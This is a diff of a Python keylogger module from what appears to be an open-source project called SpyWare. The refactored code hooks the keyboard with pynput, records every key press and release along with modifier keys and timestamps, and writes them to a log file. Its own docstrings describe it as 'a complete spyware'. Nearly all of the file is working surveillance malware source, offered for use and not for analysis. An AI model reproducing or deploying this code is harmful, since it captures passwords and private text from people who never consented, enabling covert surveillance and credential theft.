@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-""" This package implement a spyware to get keyboard event. """
-
 ###################
-#    This package implement a spyware to get keyboard event.
-#    Copyright (C) 2021  Maurice Lambert
+#    This file implements a keylogger.
+#    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -21,109 +19,185 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
+"""
+This file implements a keylogger.
+
+~# python3 KeyLogger.py keySpy.conf
+
+>>> from os import environ
+>>> environ['keySpy.conf'] = 'keySpy.conf'
+>>> from SpyWare.KeyLogger import keySpy
+>>> keySpy()                  # (using env) OR
+>>> keySpy('keySpy.conf')     # (using config file name) OR
+>>> keySpy(argv=["KeyLogger.py", "keySpy.conf"]) # (using argv)
+"""
+
+__version__ = "1.0.0"
+__author__ = "Maurice Lambert"
+__author_email__ = "mauricelambert434@gmail.com"
+__maintainer__ = "Maurice Lambert"
+__maintainer_email__ = "mauricelambert434@gmail.com"
+__description__ = """
+This file implements a complete spyware.
+"""
+license = "GPL-3.0 License"
+__url__ = "https://github.com/mauricelambert/SpyWare"
+
+copyright = """
+SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+"""
+__license__ = license
+__copyright__ = copyright
+
 __all__ = ["Daemon", "KeyLogger", "main", "config_load"]
 
 from pynput.keyboard import Key, Listener, Controller, KeyCode
 from time import localtime, strftime, struct_time
+from os.path import join, dirname, exists
 from configparser import ConfigParser
-from os import path, environ
-from enum import Enum
-from sys import argv
+from typing import Union, List
+from sys import argv, exit
+from os import environ
 
 
-def config_load(filename: str=None) -> None:
+class CONFIGURATIONS:
 
-    """ This function load the config file. """
+    """
+    This class contains configurations.
+    """
 
-    global Constantes
-    
+    save_filename: str = "keySpy.txt"
+    event_press: int = 0
+    event_release: int = 0
+    hot_keys: int = 1
+    event_time: int = 1
+
+
+def config_load(filename: str = None, argv: List[str] = argv) -> int:
+
+    """
+    This function loads the configuration using a the configuration file.
+    """
+
     CONFIG = ConfigParser()
-    env_conf_file = environ.get("keySpy.conf")
+    default_file_name = "keySpy.conf"
 
-    if filename is not None:
+    default_file_path = join(dirname(__file__), default_file_name)
+    env_config_file = environ.get(default_file_name)
+    arg_config_file = argv[1] if len(argv) == 2 else None
+
+    if filename is not None and exists(filename):
         CONFIG.read(filename)
-    elif len(argv) == 2:
-        CONFIG.read(argv[1])
-    elif env_conf_file:
-        CONFIG.read(env_conf_file)
+    elif arg_config_file is not None and exists(arg_config_file):
+        CONFIG.read(arg_config_file)
+    elif env_config_file and exists(env_config_file):
+        CONFIG.read(env_config_file)
+    elif exists(default_file_path):
+        CONFIG.read(default_file_path)
     else:
-        CONFIG.read(path.join(path.dirname(__file__), "keySpy.conf"))
+        return 1
 
-
-    class Constantes(Enum):
-
-        save_filename: str = CONFIG["SAVE"]["filename"]
-        write_eventPress: int = CONFIG.getint("SAVE", "event_press")
-        write_eventRelease: int = CONFIG.getint("SAVE", "event_release")
-        write_hotKeys: int = CONFIG.getint("SAVE", "hot_keys")
-        write_eventTime: int = CONFIG.getint("SAVE", "event_time")
+    CONFIG = CONFIG.__dict__["_sections"]
+    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
+        "filename", "keySpy.txt"
+    )
+    CONFIGURATIONS.event_press = int(
+        CONFIG.get("SAVE", {}).get("event_press", "0")
+    )
+    CONFIGURATIONS.event_release = int(
+        CONFIG.get("SAVE", {}).get("event_release", "0")
+    )
+    CONFIGURATIONS.hot_keys = int(CONFIG.get("SAVE", {}).get("hot_keys", "1"))
+    CONFIGURATIONS.event_time = int(
+        CONFIG.get("SAVE", {}).get("event_time", "1")
+    )
+    return 0
 
 
 class KeyLogger:
 
-    """ This class implement a keylogger. """
+    """
+    This class implements a keylogger.
+    """
 
     def __init__(self):
-        self.is_pressed: list = []
-        self.file: str = Constantes.save_filename.value
         self.controller: Controller = Controller()
+        filename = self.file = CONFIGURATIONS.save_filename
+        self.data_file = open(filename, "a")
+        self.is_pressed = set()
+        self.counter = 0
         self.run = True
+        self.data = ""
 
     def get_event_press(self, event: Key) -> None:
 
-        """ This method add a key press event. """
+        """
+        This method add a key press event.
+        """
 
+        controller = self.controller
+        is_pressed = self.is_pressed
         key: str = self.get_event_char(event)
 
-        if Constantes.write_hotKeys.value:
-            for event in self.is_pressed:
+        if CONFIGURATIONS.hot_keys:
+            for event in is_pressed:
                 key = f"{event} <{key}>"
 
-        if Constantes.write_eventPress.value:
-            key += "PRESS: " + key
+        if CONFIGURATIONS.event_press:
+            key = f"PRESS: {key}"
 
-        if self.controller.shift_pressed:
+        if controller.shift_pressed:
             key += " (MAJ)"
-        if self.controller.alt_pressed:
+        if controller.alt_pressed:
             key += " (ALT)"
-        if self.controller.alt_gr_pressed:
+        if controller.alt_gr_pressed:
             key += " (ALTGR)"
-        if self.controller.ctrl_pressed:
+        if controller.ctrl_pressed:
             key += " (CTRL)"
 
-        self.is_pressed.append(event)
+        is_pressed.add(event)
 
-        self.save(key + "\n")
+        self.save(f"{key}\n")
         return self.run
 
-    def get_code(self, event) -> int:
+    def get_code(self, event: Union[Key, KeyCode]) -> int:
 
-        """ This function return the code of Key or KeyCode. """
+        """
+        This function return the code of Key or KeyCode.
+        """
 
-        if type(event) == KeyCode:
+        if isinstance(event, KeyCode):
             code = event.vk
-        elif type(event) == Key:
+        elif isinstance(event, Key):
             code = event._value_.vk
 
         return code
 
     def get_event_release(self, event: Key) -> None:
 
-        """ This method add a key release event. """
+        """
+        This method add a key release event.
+        """
 
-        if Constantes.write_eventRelease.value:
-            self.save("RELEASE: " + self.get_event_char(event) + "\n")
+        if CONFIGURATIONS.event_release:
+            self.save(f"RELEASE: {self.get_event_char(event)}\n")
 
-        code = self.get_code(event)
+        # code = self.get_code(event)
 
-        if len(self.is_pressed):
-            self.is_pressed.pop()
+        is_pressed = self.is_pressed
+        if is_pressed:
+            is_pressed.pop()
 
         return self.run
 
     def run_for_ever(self) -> None:
 
-        """ Start the keylogger. """
+        """
+        This function starts the keylogger.
+        """
 
         with Listener(
             on_press=self.get_event_press, on_release=self.get_event_release
@@ -132,30 +206,39 @@ class KeyLogger:
 
     def save(self, key: str) -> None:
 
-        """ This method save pressed keys in file and clean the events list. """
+        """
+        This method save pressed keys in file and clean the events list.
+        """
 
-        if Constantes.write_eventTime.value:
-            text = strftime(f"%Y-%m-%d %H:%M:%S -> {key}")
+        if CONFIGURATIONS.event_time:
+            text = f'{strftime("%Y-%m-%d %H:%M:%S")} -> {key}'
         else:
             text = key
 
-        with open(self.file, "a") as file:
-            file.write(text)
+        self.counter += 1
+        self.data_file.write(text)
+
+        if self.counter >= 1000:
+            self.data_file.close()
+            self.data_file = open(self.file, "a")
+            self.counter = 0
 
     def get_event_char(self, event: Key) -> str:
 
-        """ This function get event.char if exist. """
+        """
+        This function get event.char if exist.
+        """
 
-        char: str = event.__dict__.get("char")
-
-        if char is None:
-            char: str = str(event)
-
-        return char
+        return event.__dict__.get("char") or str(event)
 
 
-def main() -> None:
-    config_load()
+def main(config_filename: str = None, argv: List[str] = argv) -> int:
+
+    """
+    This function executes this script from the command line.
+    """
+
+    config_load(filename=config_filename, argv=argv)
 
     daemon = Daemon()
 
@@ -164,8 +247,11 @@ def main() -> None:
     except KeyboardInterrupt:
         daemon.run = False
 
+    return 0
+
 
 Daemon = KeyLogger
 
 if __name__ == "__main__":
-    main()
+    print(copyright)
+    exit(main())
